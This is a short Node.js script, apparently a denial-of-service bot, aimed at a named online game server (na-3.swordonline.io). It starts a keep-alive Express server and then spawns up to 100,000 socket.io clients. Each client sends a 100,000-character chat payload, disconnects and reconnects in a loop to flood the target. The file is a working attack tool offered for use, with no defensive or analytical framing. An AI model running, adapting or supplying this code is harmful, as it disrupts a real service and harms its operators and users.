// === EXPRESS SERVER ===
const express = require("express");
const app = express();
const port = process.env.PORT || 3000;
app.get("/", (_, res) => res.send("Bot is running"));
app.listen(port, () => console.log(`Express server running on port ${port}`));

const io = require("socket.io-client");

const servers = ["https://na-3.swordonline.io"];

const clientsPerServer = Math.floor(100000 / servers.length);

servers.forEach((server, idx) => {
  for (let i = 0; i < clientsPerServer; i++) {
    const clientIndex = idx * clientsPerServer + i;

    setTimeout(() => {
      const socket = io(server);

      socket.on("connect", () => {
        socket.emit("keyPressX", {
          inputId: "chatMessage",
          state: "a".repeat(100_000),
        });

        setTimeout(() => {
          socket.disconnect();
        }, 0);
      });

      socket.on("disconnect", () => {
        setTimeout(() => {
          socket.connect();
        }, 0);
      });
    }, clientIndex * 50);
  }
});
